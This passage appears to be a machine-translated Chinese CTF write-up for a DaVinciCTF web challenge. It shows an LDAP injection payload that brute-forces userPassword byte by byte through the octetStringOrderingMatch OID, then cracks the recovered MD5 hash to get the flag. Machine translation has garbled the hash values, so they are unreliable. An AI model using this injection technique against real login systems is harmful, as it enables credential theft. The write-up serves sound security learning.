translated">在蛮力尝试对描述起作用之后，我们对userPassword进行了同样的尝试，因为它是LDAP的标准密码键。使用*请求工作正常，但是，我们尝试的任何字符都不会导致“无效的用户名/密码！”但只有“没有这个用户！”。</p><p id="bc38" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在互联网上搜索针对LDAP的userPassword的暴力方法导致了另一篇具有完全相同问题的文章:</p><p id="a0f9" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><a class="ae lx" href="https://0xukn.fr/posts/writeupecw2018admyssion/" rel="noopener ugc nofollow" target="_blank">https://0xukn.fr/posts/writeupecw2018admyssion/</a></p><p id="5dd9" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">userPassword是一个八位字节字符串，因此不能像普通字符串一样被强行破解。但是，我们可以在userPassword上使用其他操作符，例如，octetStringOrderingMatch。为此，我们只需在userPassword后面添加octetStringOrderingMatch 2.5.13.18的OID，就可以暴力破解字节值，如下面的有效载荷所示。</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="eb8a" class="mo kt ix mk b gy mp mq l mr ms">email=mkiloa@dvctf.local)(userPassword:2.5.13.18:=\7b\4d\44\35\7d\41\&lt;add the next byte here&gt;))%00&amp;password=*</span></pre><p id="3d9b" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">更详细的描述，你可以阅读<a class="ae lx" href="https://0xukn.fr/posts/writeupecw2018admyssion/" rel="noopener ugc nofollow" target="_blank">提到的文章</a>，他们做得比我好:)</p><p id="447f" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后，在对密码哈希进行强制后，我们得到了MD5哈希的base64<em class="lt">{ MD5 } ABR 2 wimrer 7 gj 9 jpet 1 pa = =</em>，结果是01 ba F6 a 56226 ade 47 B1 a3 f 63 a5 EB 753 c。</p><p id="d479" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">将这个散列提交给<a class="ae lx" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank">https://crackstation.net/</a>，我们收到密码鸡123。</p><p id="958a" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们可以登录mkiloa@dvctf.local查看标志<strong class="jw iy"> dvCTF{th4nk_y0u_mR_UKN} </strong></p><h1 id="7f0a" class="ks kt ix bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">摘要</h1><p id="1db2" class="pw-post-body-paragraph ju jv ix jw b jx oe jz ka kb of kd ke kf og kh ki kj oh kl km kn oi kp kq kr ij bi translated">这些都是网络挑战，我希望你像我喜欢CTF一样喜欢我的文章。这是一个伟大的CTF，从容易到中等的难度曲线很好。</p><p id="c04e" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我只能推荐每个人在挑战代码在线时尝试他们的一些挑战，因为它们质量很好，非常适合初学者。我们肯定会将它们纳入我们在CTF为初学者举办的研讨会。</p><p id="2356" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，有一个伟大的一天，可能会阅读我的其他写了这个CTF或更多我的文章。</p><div class="ip iq gp gr ir oj"><a href="https://fh4ntke.medium.com/post-office-davincictf-writeup-ab1324a65377" rel="noopener follow" target="_blank"><div class="ok ab fo"><div class="ol ab om cl cj on"><h2 class="bd iy gy z fp oo fr fs op fu fw iw bi translated">邮局—达文西特—报道</h2><div class="oq l"><h3 class="bd b gy z fp oo fr fs op fu fw dk translated">与海盗的对话</h3></div><div class="or l"><p class="bd b dl z fp oo fr fs op fu fw dk translated">fh4ntke.medium.com</p></div></div><div class="os l"><div class="ot l ou ov ow os ox it oj"/></div></div></a></div><p id="ff8c" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后，我只能说感谢达芬奇密码背后的团队，感谢我的团队同事，玩得很开心。</p></div></div>    
</body>
</html>